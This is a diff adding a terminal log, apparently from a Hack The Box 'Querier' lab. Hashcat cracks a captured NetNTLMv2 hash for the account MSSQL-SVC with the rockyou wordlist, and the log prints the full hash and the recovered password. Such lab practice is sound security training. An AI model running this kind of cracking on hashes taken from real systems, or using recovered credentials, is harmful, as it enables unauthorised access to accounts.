@@ -1,0 +1,58 @@
+root@kali:~/HTB/Querier# hashcat -m 5600 querier.ntlmv2 /usr/share/wordlists/rockyou.txt --force
+hashcat (v5.1.0) starting...
+
+OpenCL Platform #1: The pocl project
+====================================
+* Device #1: pthread-Intel(R) Core(TM) i5-3340M CPU @ 2.70GHz, 512/1428 MB allocatable, 2MCU
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+ATTENTION! Pure (unoptimized) OpenCL kernels selected.
+This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
+If you want to switch to optimized OpenCL kernels, append -O to your commandline.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=5600 -D _unroll'
+* Device #1: Kernel m05600_a0-pure.5f9d72c2.kernel not found in cache! Building may take a while...
+Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106869 bytes (47.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660302 bytes (71.Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213744 bytes (95.Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 8 secs
+
+MSSQL-SVC::QUERIER:70d6cff8017d0320:4ea696e3beb91f01f6e6fc88e8ac18eb:0101000000000000c0653150de09d20129b9323554e841b6000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000a7df4488945c965067dda1c7425adb9bdd92683641f30c3d48ab8ec107106ceb0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e00310037003000000000000000000000000000:corporate568
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: NetNTLMv2
+Hash.Target......: MSSQL-SVC::QUERIER:70d6cff8017d0320:4ea696e3beb91f0...000000
+Time.Started.....: Thu Mar 14 10:51:27 2019 (48 secs)
+Time.Estimated...: Thu Mar 14 10:52:15 2019 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   369.6 kH/s (4.45ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 8960000/14344385 (62.46%)
+Rejected.........: 0/8960000 (0.00%)
+Restore.Point....: 8957952/14344385 (62.45%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: correita.54 -> cornbread3
+
+Started: Thu Mar 14 10:50:46 2019
+Stopped: Thu Mar 14 10:52:17 2019
+root@kali:~/HTB/Querier# 
+
